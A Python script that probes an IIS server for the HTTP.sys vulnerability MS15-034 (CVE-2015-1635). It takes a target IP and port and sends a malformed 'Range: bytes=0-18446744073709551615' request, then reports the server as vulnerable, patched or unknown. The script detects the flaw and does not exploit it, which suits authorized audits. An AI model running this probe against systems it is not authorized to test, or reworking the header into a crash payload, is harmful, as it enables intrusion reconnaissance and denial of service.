import socket
import random


print("""
--------------------------------------------------
HTTP.SYS远程代码执行漏洞_CVE-2015-1635（MS15-034）
--------------------------------------------------
""")
ipAddr=input("target_ip:")
ipPort=int(input("target_port(default 80):")or "80")
hexAllFfff = "18446744073709551615"
req1 = "GET / HTTP/1.0\r\n\r\n"
req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"
print("[*] Audit Started")
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, ipPort))
client_socket.send(req1.encode())
boringResp = client_socket.recv(1024).decode()
if "Microsoft" not in boringResp:
                print("[*] Not IIS")
                exit(0)
client_socket.close()
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, ipPort))
client_socket.send(req.encode())
goodResp = client_socket.recv(1024).decode()
print(goodResp)
if "Requested Range Not Satisfiable" in goodResp:
                print("[!!] 发现漏洞")
elif " The request has an invalid header name" in goodResp:
                print("[*] 已经修补")
else:
                print("[*] 无法判断")
